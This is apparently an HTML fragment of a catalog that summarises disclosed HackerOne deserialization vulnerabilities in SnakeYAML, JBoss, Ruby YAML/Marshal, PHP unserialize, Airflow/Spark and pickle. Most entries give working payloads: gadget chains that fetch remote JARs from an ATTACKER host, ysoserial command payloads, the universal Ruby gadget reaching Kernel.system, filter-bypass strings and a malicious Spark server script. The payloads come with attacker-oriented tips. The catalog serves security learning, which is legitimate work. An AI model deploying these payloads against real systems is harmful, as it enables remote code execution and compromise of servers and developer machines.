+<p class="insight"><b>Insight —</b> PHP object injection is exploitable even without a classic __destruct gadget: builtin classes whose magic methods (__call, __toString) trust an internal property's type give type-confusion primitives. When you control unserialize input, probe SoapClient, ArrayObject, SplObjectStorage and similar builtins, not just app classes.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/55030" target="_blank" rel="noopener">hackerone.com/reports/55030</a></span><a class="src" href="#report-55030" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1167773" style="--sv:var(--sev-med)" data-sev="2" data-votes="45" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SnakeYAML type instantiation RCE via !!javaClass tags</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1167773</b> · kubernetes · $1000 · 45 votes · resolved</div>
+<div class="taxo"><span>Program <b>kubernetes</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">io.kubernetes.client.util.Yaml uses SnakeYAML's default constructor, which lets a YAML document instantiate arbitrary Java classes via the !!some.Class ['arg'] tag; a class like ScriptEngineManager/URLClassLoader leads to remote code execution when a hostile YAML is loaded.</p>
+<h4>Method</h4><ol><li>Get the target to load an attacker-supplied YAML with the Java client (e.g. a CRD/manifest).</li><li>Use a !! tag to instantiate a gadget class that fetches and runs remote code.</li></ol>
+<div class="pre">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://ATTACKER/exploit.jar"]
+  ]]
+]</div>
+<p class="insight"><b>Insight —</b> On any JVM app, unsafe SnakeYAML (new Yaml() without SafeConstructor) turns YAML input into arbitrary-object instantiation. Grep for `new Yaml(` and yaml.load on request/file input; the fix is `new Yaml(new SafeConstructor())`.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1167773" target="_blank" rel="noopener">hackerone.com/reports/1167773</a></span><a class="src" href="#report-1167773" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-153026" style="--sv:var(--sev-med)" data-sev="2" data-votes="42" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>JBoss JMXInvokerServlet/EJBInvokerServlet Java deserialization RCE</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#153026</b> · starbucks · none · 42 votes · resolved</div>
+<div class="taxo"><span>Program <b>starbucks</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Exposed JBoss /invoker/JMXInvokerServlet and /invoker/EJBInvokerServlet accept a serialized MarshalledInvocation and deserialize it with vulnerable classpath gadgets (Commons Collections). Posting a ysoserial payload executes OS commands. (CVE-2017-7504 for the JBossMQ HTTPServerILServlet variant.)</p>
+<h4>Method</h4><ol><li>Find /invoker/EJBInvokerServlet or /invoker/JMXInvokerServlet</li><li>Generate a ysoserial CommonsCollections1 payload for the desired command</li><li>POST it with Content-Type application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation</li><li>Infer success from error strings (e.g. 'cannot find the file specified' for a bad path vs none for a valid binary) when egress is filtered</li></ol>
+<div class="pre">java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' &gt; serialdata
+---
+POST /invoker/EJBInvokerServlet HTTP/1.1
+Host: TARGET
+Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation
+Content-Length: &lt;len&gt;
+
+&lt;paste serialdata bytes&gt;</div>
+<p class="insight"><b>Insight —</b> Legacy JBoss invoker servlets are a classic pre-auth Java deser RCE. When egress is filtered and you get no shell, use differential error messages (valid vs invalid file/binary in the executed command) as a blind oracle to prove code execution.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/153026" target="_blank" rel="noopener">hackerone.com/reports/153026</a></span><a class="src" href="#report-153026" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1187477" style="--sv:var(--sev-med)" data-sev="2" data-votes="41" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Ruby RCE via unsafe YAML.load of a config file (.rdoc_options)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1187477</b> · ruby · none · 41 votes · resolved</div>
+<div class="taxo"><span>Program <b>ruby</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">RDoc loads .rdoc_options with YAML.load (Psych) without restricting permitted classes, so a repository-supplied config file can instantiate arbitrary objects. The universal Ruby YAML gadget chain reaches Kernel.system for RCE when rdoc runs against untrusted source. CVE-2024-27281.</p>
+<h4>Method</h4><ol><li>Place a malicious .rdoc_options YAML in a repo</li><li>Victim runs rdoc on that repo</li><li>The YAML object-injection gadget calls Kernel.system</li></ol>
+<div class="pre">---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: date
+         method_id: :resolve</div>
+<p class="insight"><b>Insight —</b> Treat YAML.load / Marshal.load / Psych.load (pre-safe defaults) on any file that ships inside untrusted input (repos, gems, uploads, config) as RCE. Grep tools/CI for YAML.load_file of dotfiles; the staaldraad universal Ruby gadget works whenever Gem/Net classes are on the load path.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1187477" target="_blank" rel="noopener">hackerone.com/reports/1187477</a></span><a class="src" href="#report-1187477" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-706934" style="--sv:var(--sev-med)" data-sev="2" data-votes="20" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Ruby Kernel#JSON unsafe object creation via nil-options branch</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#706934</b> · ruby · USD 500 · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>ruby</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The CVE-2013-0269 fix only patched the JSON parser branch taken when an options hash is supplied. Kernel#JSON / JSON.parse(x, nil) hit the no-options branch, where create_additions defaults on, allowing json_class-driven arbitrary object instantiation.</p>
+<h4>Method</h4><ol><li>Find app code passing user input to Kernel#JSON(...), JSON[...], JSON.parse(x, nil), or JSON::Parser.new(x).parse</li><li>Supply JSON containing a json_class key naming a constant with a json_create singleton method</li><li>Parser instantiates that class with attacker args; with json/add/* required this reaches OpenStruct/Regexp etc.</li></ol>
+<div class="pre">{"json_class":"A","args":[1]}
+# parsed via JSON(js) -&gt; #&lt;struct A a=1&gt; even though JSON.parse(js) is safe</div>
+<p class="insight"><b>Insight —</b> When a class has two code paths (options vs no-options, strict vs lenient), a security fix on one path often leaves the sibling exploitable. Grep for the convenience wrappers (Kernel#JSON) that quietly take the unpatched branch.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/706934" target="_blank" rel="noopener">hackerone.com/reports/706934</a></span><a class="src" href="#report-706934" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-308489" style="--sv:var(--sev-med)" data-sev="2" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Pre-auth PHP object injection via unserialize() of listing data</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#308489</b> · automattic · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Chain <b>unserialize sink -&gt; POP gadget chain -&gt; XSS/RCE</b></span></div>
+<h4>Root cause</h4><p style="margin:0">WP Job Manager's get_job_listings serializes query args into a transient and later unserialize()s data influenced by unauthenticated AJAX input, giving a PHP object injection sink if a POP gadget chain exists in loaded code.</p>
+<h4>Method</h4><ol><li>Reach the unauthenticated job_manager_ajax_get_listings action</li><li>Supply crafted serialized query args that get stored and later unserialized</li><li>If a POP gadget (__wakeup/__destruct/__toString) is present, escalate from object injection to XSS/RCE</li></ol>
+<div class="pre">add_action('job_manager_ajax_get_listings', array($this,'get_listings'));
+// get_job_listings(): set_transient($query_args_hash, $result, DAY_IN_SECONDS)
+// -&gt; later unserialize() of attacker-influenced query args</div>
+<p class="insight"><b>Insight —</b> Grep plugins for unserialize() on any request-derived value (including cached/transient/second-order paths). The bug is the sink; impact depends on available gadget chains (cf. WooCommerce 3.2.4, WP 4.8.3 research).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/308489" target="_blank" rel="noopener">hackerone.com/reports/308489</a></span><a class="src" href="#report-308489" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1807214" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SnakeYAML unsafe constructor RCE via ScriptEngineManager/URLClassLoader (CVE-2022-1471)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1807214</b> · kubernetes · USD 1000 · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>kubernetes</b></span><span>Surface <b>other</b></span><span>Chain <b>untrusted YAML -&gt; SnakeYAML type instantiation -&gt; remo</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">K8s Java Client's Dynamics.deserialize used SnakeYAML without SafeConstructor, so YAML tags can instantiate arbitrary Java types; the !!javax.script.ScriptEngineManager + !!java.net.URLClassLoader gadget loads a remote JAR whose ScriptEngineFactory static initializer runs code inside the JVM.</p>
+<h4>Method</h4><ol><li>Host a JAR exposing a malicious ScriptEngineFactory (RCE in its static initializer) with META-INF/services/javax.script.ScriptEngineFactory entry</li><li>Serve the JAR from an HTTP URL</li><li>Feed the SnakeYAML sink a payload that builds a ScriptEngineManager over a URLClassLoader pointing at your URL</li></ol>
+<div class="pre">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://ATTACKER:8080/"]]]]
+
+// JAR: static { Runtime.getRuntime().exec("..."); } in a class implementing ScriptEngineFactory
+// + /META-INF/services/javax.script.ScriptEngineFactory -&gt; your class name</div>
+<p class="insight"><b>Insight —</b> Any Yaml.load / SnakeYAML new Yaml() without SafeConstructor on untrusted input is RCE; the ScriptEngineManager+URLClassLoader gadget needs only outbound HTTP to your JAR (no gadget on the target classpath). Audit public APIs that parse YAML from users; fix = new Yaml(new SafeConstructor()).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1807214" target="_blank" rel="noopener">hackerone.com/reports/1807214</a></span><a class="src" href="#report-1807214" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-185909" style="--sv:var(--sev-med)" data-sev="2" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>unserialize() on stored data without allowed_classes (PHP object injection sink)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#185909</b> · iandunn-projects · 50 · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>iandunn-projects</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Calling PHP unserialize() on data an attacker can influence, without restricting allowed_classes, permits POP-chain object injection and exposes the app to unserialize engine bugs.</p>
+<h4>Method</h4><ol><li>Grep source for unserialize( on stored/user-influenced values (here $item-&gt;data)</li><li>If the value is attacker-controllable, craft a serialized payload instantiating gadget classes present in the codebase (POP chain)</li><li>Trigger a magic method (__wakeup/__destruct) to reach a dangerous sink</li></ol>
+<div class="pre">$option = unserialize( $item-&gt;data );
+// vulnerable: no allowed_classes
+// safe form:
+$option = unserialize($item-&gt;data, ['allowed_classes' =&gt; false]);</div>
+<p class="insight"><b>Insight —</b> Treat every unserialize()/deserialization call on non-constant data as a POP sink; the exploitability depends on available gadget classes. In audits, map unserialize() sinks first, then hunt for reachable __wakeup/__destruct gadgets.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/185909" target="_blank" rel="noopener">hackerone.com/reports/185909</a></span><a class="src" href="#report-185909" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-261338" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>unserialize() heap use-after-free / over-read on untrusted data (PHP)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#261338</b> · ibb · awarded · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>untrusted input -&gt; unserialize() -&gt; heap UAF/over-read</b></span></div>
+<h4>Root cause</h4><p style="margin:0">PHP's var_unserializer (finish_nested_data / zval_get_type paths) mishandles crafted serialized input, yielding a heap use-after-free (CVE-2017-12934) and buffer over-reads (CVE-2017-12933 / CVE-2016-10161) that corrupt interpreter integrity.</p>
+<h4>Method</h4><ol><li>Find a sink calling unserialize() (or a framework that unserializes cookies/cache/session) on user-controlled bytes.</li><li>Supply a crafted serialized payload exercising nested/reference structures.</li><li>var_unserializer frees-then-uses or reads past the buffer -&gt; UAF / OOB read.</li></ol>
+<div class="pre">// Any endpoint reaching unserialize($_user_input)
+// Crafted nested serialized data triggers finish_nested_data UAF/over-read.
+// CVEs: 2017-12934 (UAF), 2017-12933 (over-read), 2016-10161 (OOB read)
+// Advisories: https://bugs.php.net/bug.php?id=74101 / 74111 / 73825</div>
+<p class="insight"><b>Insight —</b> Beyond PHP object injection (POP chains), unserialize() on attacker data is a raw memory-corruption surface in the C parser itself. Treat any user-reachable unserialize (cookies, cache, __PHP_Incomplete_Class, message queues) as both a logic AND memory-safety sink; reference/nested-structure payloads are the fuzz seeds.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/261338" target="_blank" rel="noopener">hackerone.com/reports/261338</a></span><a class="src" href="#report-261338" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-245228" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP unserialize regex-firewall bypass via lowercase o: and capital S:</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#245228</b> · automattic · awarded · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A blacklist regex meant to block object injection ([CO]:\+?[0-9]+:") only catches uppercase C/O class markers, but PHP's native unserialize() also accepts lowercase o: (StdClass) and capital S: (hex-escaped string), so a crafted payload passes the filter yet still instantiates objects.</p>
+<h4>Method</h4><ol><li>Locate the anti-object-injection guard: preg_match('/^a:2:{/',$x) &amp;&amp; !preg_match('/[CO]:\+?[0-9]+:"/',$x) &amp;&amp; maybe_unserialize($x).</li><li>Build a serialized array whose nested class markers use lowercase o: instead of O:, and S: (uppercase-S hex string) to further evade WAF signatures.</li><li>In WooCommerce, the PayPal PDT $raw_custom flows into this check, letting an attacker forge an arbitrary order object.</li></ol>
+<div class="pre">$attack_str = 'a:2:{i:1;s:3:"key";i:0;o:3:"s:2:"ID";o:1:"s:0:"";o:1:"s:2:"ID";S:1:"1";}}s:9:"order_key";s:3:"key";s:9:"post_type";s:2:"ok";}}';</div>
+<p class="insight"><b>Insight —</b> When you see a regex that filters unserialize input, test the case-insensitive and alternate type tokens PHP accepts: O: vs o:, C: vs c:, and S: (hex-escaped) vs s:. Blacklists that only match uppercase C/O are trivially bypassed, and capital S: also slips past many WAF rules.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/245228" target="_blank" rel="noopener">hackerone.com/reports/245228</a></span><a class="src" href="#report-245228" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-180909" style="--sv:var(--sev-med)" data-sev="2" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP ArrayObject unserialize double-free / UAF</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#180909</b> · ibb · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">SPL ArrayObject::unserialize calls zval_ptr_dtor(&amp;intern-&gt;array) on failure, but spl_array_object_free_storage also dtors/efrees the same object during destruction -&gt; double-free / UAF. A CURLFile::__wakeup with an R:1 self back-reference frees the object before the second dtor uses it.</p>
+<h4>Method</h4><ol><li>Wrap a failing inner payload in a C:11:"ArrayObject":... custom-serialization envelope</li><li>On unserialize failure zval_ptr_dtor frees intern-&gt;array once; free_storage frees it again</li><li>Variant: inner CURLFile with R:1 triggers __wakeup that frees the object then zval_ptr_dtor uses freed memory</li></ol>
+<div class="pre">&lt;?php
+$inner = 'x:i:1;O:8:"stdClass":1:{};m:a:0:{}';
+$exploit = 'C:11:"ArrayObject":'.strlen($inner).':{'.$inner.'}';
+unserialize($exploit);
+// variant: $inner = 'x:i:1;O:8:"CURLFile":1:{s:4:"name";R:1;};m:a:0:{}';</div>
+<p class="insight"><b>Insight —</b> Look for SPL/built-in classes whose unserialize() dtors a member on the error path while the storage-free path dtors it again. R:1/back-references and __wakeup let you free an object mid-unserialize to set up the double-free.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/180909" target="_blank" rel="noopener">hackerone.com/reports/180909</a></span><a class="src" href="#report-180909" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-195950" style="--sv:var(--sev-med)" data-sev="2" data-votes="3" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP unserialize() uninitialized-memory -&gt; controlled destructor RCE (CVE-2017-5340)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#195950</b> · ibb · awarded · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>crafted serialized length -&gt; int-overflow alloc fail -&gt</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A crafted serialized string with a huge array length triggers an integer-overflow allocation failure that leaves a zend_array partially initialized from attacker-controlled bytes; during shutdown zend_hash_destroy calls the array pDestructor, now an attacker-controlled pointer, yielding RCE.</p>
+<h4>Method</h4><ol><li>Craft payload with an oversized array length (e.g. a:9000111000000010:{...) filled with controlled bytes</li><li>Pass it to unserialize(); allocation overflows and aborts, leaving faked object memory</li><li>On shutdown ht-&gt;pDestructor(&amp;p-&gt;val) calls the attacker-controlled pointer (ROP to command exec)</li></ol>
+<div class="pre">unserialize($payload);  // $payload: a:9000111000000010:{ ...0x30 filler controlling zend_array... }
+// pDestructor overwritten -&gt; zend_hash_destroy: ht-&gt;pDestructor(&amp;p-&gt;val) -&gt; ROP -&gt; exec</div>
+<p class="insight"><b>Insight —</b> unserialize() on any attacker-controlled string is dangerous even without app-level gadget classes; oversized-length + integer overflow can leave engine structures uninitialized and give a raw function-pointer primitive. Found via afl-fuzz.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/195950" target="_blank" rel="noopener">hackerone.com/reports/195950</a></span><a class="src" href="#report-195950" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2127968" style="--sv:var(--sev-med)" data-sev="2" data-votes="2" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse deserialization RCE: malicious Spark server attacks Airflow PySpark client (CVE-2023-40195)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2127968</b> · ibb · awarded · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>authorized-to-configure-Spark-connection -&gt; point to mali</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Spark RPC client (used by Airflow's Spark provider via spark-submit) deserializes data returned by the Spark master; a user who can set the connection Host/Port to a malicious Spark server gets that server's Java gadget payload deserialized and executed on the Airflow worker.</p>
+<h4>Method</h4><ol><li>As an Airflow user authorized to configure Spark hooks, create/edit the spark_default connection Host=spark://ATTACKER_IP Port=PORT.</li><li>Generate a Java gadget payload with ysoserial (e.g. CommonsCollections4) that runs an OS command.</li><li>Run a malicious Spark server that speaks just enough of the Spark wire protocol to hand the payload back to the connecting client.</li><li>Trigger a DAG using SparkSubmitOperator; spark-submit connects to the evil master and deserializes the payload -&gt; RCE on the Airflow worker.</li></ol>
+<div class="pre"># 1) gadget payload:
+java -jar ysoserial.jar CommonsCollections4 "touch /tmp/thisisRCE" &gt; exp.der
+
+# 2) evil spark master (frames payload into Spark RPC response):
+def build_msg(request_id):
+    payloadObj = open(sys.argv[2],'rb').read()
+    msg_type = '\x04'
+    msg = struct.pack('&gt;Q',len(payloadObj) + 21) + msg_type + request_id
+    msg += struct.pack('&gt;I',len(payloadObj)) + payloadObj
+    return msg
+# ThreadingTCPServer replies with build_msg(msg[9:17]) when a client connects
+# python2 evil_spark_server.py 8888 exp.der
+
+# 3) client trigger:
+spark-submit --master spark://ATTACKER_IP:8888 --name x /tmp/file</div>
+<p class="insight"><b>Insight —</b> Deserialization is bidirectional: a CLIENT that deserializes server responses is exploitable by a malicious server. Whenever a target lets a low-priv user point a connector/hook at an arbitrary host (DB, Spark, LDAP, JMX, RMI), assume the client-side response parser is a deserialization sink and stand up a hostile server.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2127968" target="_blank" rel="noopener">hackerone.com/reports/2127968</a></span><a class="src" href="#report-2127968" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1593913" style="--sv:var(--sev-med)" data-sev="2" data-votes="14" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SSRF -&gt; memcached poisoning -&gt; .NET deserialization RCE (GitHub SVNBridge CVE-2022-23734)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1593913</b> · github · awarded · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>github</b></span><span>Surface <b>web</b></span><span>Chain <b>SSRF -&gt; memcached write -&gt; deserialization on cache re</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">GitHub Enterprise SVNBridge deserializes objects it reads from memcached; an SSRF that lets the attacker write to the memcached instance controls the serialized data and yields RCE on the SVNBridge component.</p>
+<h4>Method</h4><ol><li>Find an SSRF that can speak to the internal memcached port.</li><li>Write a malicious serialized .NET object into a cache key that SVNBridge later reads.</li><li>SVNBridge deserializes the poisoned cache entry -&gt; RCE.</li></ol>
+<p class="insight"><b>Insight —</b> Caches (memcached/Redis) that store serialized objects are deserialization sinks; if any SSRF or injection can write to the cache, you get code execution without ever touching the primary request path. When you find object-caching + an SSRF, try to poison the cache.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1593913" target="_blank" rel="noopener">hackerone.com/reports/1593913</a></span><a class="src" href="#report-1593913" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1119120" style="--sv:var(--sev-low)" data-sev="1" data-votes="28" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side Ruby Marshal RCE via malicious dependency API response (Bundler)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1119120</b> · rubygems · none · 28 votes · resolved</div>
+<div class="taxo"><span>Program <b>rubygems</b></span><span>Surface <b>web</b></span><span>Chain <b>malicious source / MITM -&gt; Marshal response -&gt; Marshal</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Bundler fetches GET /api/v1/dependencies and Marshal.load()s the response body; a malicious/MITM'd gem source returns a crafted Marshal payload built from the universal Ruby 2.x-3.x deserialization gadget, executing code on the client running `bundle install`.</p>
+<h4>Method</h4><ol><li>Stand up a rogue gem source that returns the Marshal gadget for /api/v1/dependencies.</li><li>Point a Gemfile's source at it (or MITM a real source).</li><li>Running `bundle install` deserializes the response and runs the embedded command on the developer/CI machine.</li></ol>
+<div class="pre"># universal Ruby 2.x-3.x gadget (runs `date`):
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', 'date')
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0); i.instance_variable_set('@header', 'aaa')
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i); n.instance_variable_set('@debug_output', wa2)
+t = Gem::Package::TarReader.allocate; t.instance_variable_set('@io', n)
+r = Gem::Requirement.allocate; r.instance_variable_set('@requirements', t)
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])</div>
+<p class="insight"><b>Insight —</b> Deserialization sinks are not only server-side: clients that Marshal.load/pickle.load/readObject a server RESPONSE are RCE targets under a malicious source or MITM. Any Marshal.dump/Marshal.load over the network is dangerous even without an obvious gadget in-app -- the universal Ruby gadget always works.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1119120" target="_blank" rel="noopener">hackerone.com/reports/1119120</a></span><a class="src" href="#report-1119120" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-361341" style="--sv:var(--sev-low)" data-sev="1" data-votes="18" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Second-order Python pickle RCE via SQL-injectable notification store (Liberapay)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#361341</b> · liberapay · none · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>liberapay</b></span><span>Surface <b>web</b></span><span>Chain <b>SQL injection (or other write) -&gt; poisoned pickle in noti</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Notifications are serialized/deserialized with pickle and the notif context is read back from the DB via deserialize(); pickle.loads on any DB-controlled value is arbitrary-object -&gt; RCE, so a SQL injection that writes the notifications.context column escalates directly to code execution.</p>
+<h4>Method</h4><ol><li>Locate a pickle deserialize() reading a DB column (here render_notifications reads notifications.context).</li><li>Write a malicious pickle into that column (via SQLi or any write primitive).</li><li>When the victim views notifications, the pickle is loaded and the command runs.</li></ol>
+<div class="pre">UPDATE notifications SET context = E'\\x80027d710028...63706f7369780a73797374656d0a...736c65657020353030303030...' WHERE id = 43;
+# pickle payload runs system('sleep 500000')</div>
+<p class="insight"><b>Insight —</b> Treat pickle.loads/Marshal on DB-stored blobs as a second-order RCE sink: it converts any write primitive (SQLi, mass-assignment, an admin field) into code execution. When you find pickle over persisted data, hunt for a way to control that data rather than dismissing it as internal.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/361341" target="_blank" rel="noopener">hackerone.com/reports/361341</a></span><a class="src" href="#report-361341" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1051192" style="--sv:var(--sev-low)" data-sev="1" data-votes="17" data-bounty="250">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Python yaml.load() unsafe deserialization -&gt; command execution</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1051192</b> · kubernetes · USD 250 · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>kubernetes</b></span><span>Surface <b>other</b></span><span>Tag <b>file-upload</b></span></div>
